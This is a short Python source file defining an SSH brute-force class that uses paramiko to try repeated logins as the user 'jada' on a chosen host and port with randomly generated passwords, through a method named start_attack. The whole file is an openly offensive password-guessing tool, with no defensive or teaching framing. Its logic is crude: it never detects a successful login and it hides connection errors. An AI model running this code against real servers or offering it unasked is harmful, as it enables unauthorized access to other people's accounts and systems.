import paramiko
import string
import random


class SSHBruteForce:

    def __connect(self, username: str, password: str, port: int, host: str):
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        print("Connecting")

        try:
            ssh.connect(host, port=port, username=username, password=password, banner_timeout=200)
        except Exception as e:
            print("Error: ", e)

    def __generate_random_password(self):
        length = random.randint(1, 50)
        character_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation

        return "".join(random.sample(character_set, length))

    def start_attack(self, host: str, port: int, tries: int):
        for n in range(tries):
            password = self.__generate_random_password()
            print("Trying password: ", password)
            self.__connect("jada", password, port, host)
